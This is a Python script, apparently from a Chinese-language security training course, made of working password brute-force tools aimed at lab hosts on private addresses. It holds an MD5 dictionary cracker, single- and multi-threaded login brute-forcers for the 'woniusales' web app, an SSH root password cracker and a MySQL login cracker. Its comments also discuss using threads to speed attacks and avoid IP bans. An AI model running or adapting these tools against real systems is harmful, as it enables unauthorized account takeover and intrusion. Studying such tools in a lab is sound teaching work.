import hashlib,os,requests,threading


# 将字典中的数据读取出来，存放在一个列表中，然后对每一个数据进行MD5摘要，然后对比md5的摘要值是否相等
import time

pw_list = []
def force_md5(md5_str,root_path):
    pw_list = []
    for root,dirs,files in os.walk(root_path):
        for file in files:
            # print(files)
            with open(f'./passdict/{file}',mode='r') as file:
                data = file.readlines()
            pw_list.extend(data)
        # with open('./dict/top10000.txt') as file:
        #     data = file.readlines()
        # pw_list.extend(data)
    for password in pw_list:
        # print(password.strip())
        if hashlib.md5(password.strip().encode()).hexdigest() == md5_str:
            print(f'爆破成功，密码为：{password}')
            exit(0)
    else:
            print('很遗憾，爆破失败')

def generate_md5(source):
    return hashlib.md5(source.encode()).hexdigest()

def singlethread_force_woniusales(userdictpath,passdictpath):
    user_list = []
    pass_list = []
    for root,dirs,files in os.walk(userdictpath):
        for file in files:
            with open(f'./userdict/{file}',mode='r') as file:
                content = file.readlines()
            user_list.extend(content)
    for root,dirs,files in os.walk(passdictpath):
        for file in files:
            with open(f'./passdict/{file}',mode='r') as file:
                content = file.readlines()
            pass_list.extend(content)
    count = 0
    for username in user_list:
        for password in pass_list:
            data = {'username': username.strip(), 'password': password.strip(), 'verifycode': '0000'}
            url =  'http://192.168.230.147:8080/woniusales/user/login'
            resp = requests.post(url=url,data=data)
            count += 1
            if 'login-fail' not in resp.text:
                print(f'疑似破解成功。用户名为{data["username"]} 密码为{data["password"]}')
                print(f'一共尝试破解{count}次')
                exit(0)




# 但是针对这种情况，有两个问题
# 使用同一个线程，爆破效率太慢
# 使用同一个ip，很容易被查封
# 因此可以适用多线程爆破方式
count = 0
# 多线程调用的函数，但适用于一个线程处理一个用户名
def multithread_force_woniusales_01(username):
    global count
    url = 'http://192.168.230.147:8080/woniusales/user/login'
    with open('passdict/passtest.txt', mode='r') as file:
        pass_list = file.readlines()
    for password in pass_list:
        count += 1
        data = {'username':username,'password':password.strip(),'verifycode':'0000'}
        resp = requests.post(url=url,data=data)
        if 'login-fail' not in resp.text:
            print(f'疑似破解成功。用户名为{username} 密码为{password.strip()}')
            print(f'一共破解{count}次')
            return password
            # exit(0)
# 一个用户名一个线程
def multithread_01(userdict):
    with open(userdict,mode='r') as file:
        user_list = file.readlines()
    # 有多少个用户就开启多少个线程
    for username in user_list:
        t = threading.Thread(target=multithread_force_woniusales_01,args=(username.strip(),))
        t.start()
        print(f'{username.strip()}线程正在爆破')
        # if not t.is_alive():
        #     return True




# 但是如果用户字典有非常多的数据该怎么办
# 尝试使用一个线程只处理10个用户
# 多线程调用的函数，但适用于一个线程处理多个用户名
def multithread_force_woniusales_02(user_list):
    global count
    url = 'http://192.168.230.147:8080/woniusales/user/login'
    with open('./passdict/passtest.txt',mode='r') as file:
        pass_list = file.readlines()
    for username in user_list:
        for password in pass_list:
            count += 1
            data = {'username': username.strip(), 'password': password.strip(), 'verifycode': '0000'}
            resp = requests.post(url=url, data=data)
            if 'login-fail' not in resp.text:
                print(f'疑似破解成功。用户名为{username} 密码为{password.strip()}')
                print(f'一共破解{count}次')
                return password
# 十个用户名一个线程
def multithread_02(userdict):
    with open(userdict,mode='r') as file:
        user_list = file.readlines()
    for i in range(0,len(user_list),10):
        subuser_list = user_list[i:i+10]
        t = threading.Thread(target=multithread_force_woniusales_02,args=(subuser_list,))
        t.start()
        print(f'第{i//10}线程正在爆破')
        if not t.is_alive():
            return True


# 爆破SSH
def ssh_crack():
    import paramiko
    with open('./passdict/passtest.txt',mode='r') as file:
        password_list = file.readlines()
    # password_list = [password.strip() for password in password_list]  # 列表推导式
    for password in password_list:
        try:
            transport = paramiko.Transport(('192.168.230.147',22))
            transport.connect(username='root',password=password.strip())
            print(f'用户名 root ，密码 {password} 登录成功')
            return 0
        except:
            pass
        time.sleep(2)


# 爆破MySQL
def mysql_crack():
    import pymysql
    with open('./userdict/usertest.txt',mode='r') as file:
        username_list = file.readlines()
    with open('./passdict/passtest.txt',mode='r') as file:
        password_list = file.readlines()
    username_list = [username.strip() for username in username_list]
    password_list = [password.strip() for password in password_list]
    for username in username_list:
        for password in password_list:
            try:
                conn = pymysql.connect(host='192.168.230.150',user=username,password=password)
                print(f'用户名 {username} 密码 {password} 登录成功')
                return 0
            except:
              print('连接失败')

if __name__ == '__main__':
    # source = generate_md5('d1bd6bc58c1d74df41a957489c9942f5')
    # print(source)
    # force_md5(source,'./passdict')

    # singlethread_force_woniusales('./userdict','./passdict')

    # 多线程，一个线程处理一个用户
    # multithread_01('./userdict/usertest.txt')

    # 多线程，一个线程处理10个用户
    # multithread_02('./userdict/usertest.txt')
    # multithread_02('./userdict/top50.txt')

    # ssh crack
    # ssh_crack()

    # mysql crack
    mysql_crack()
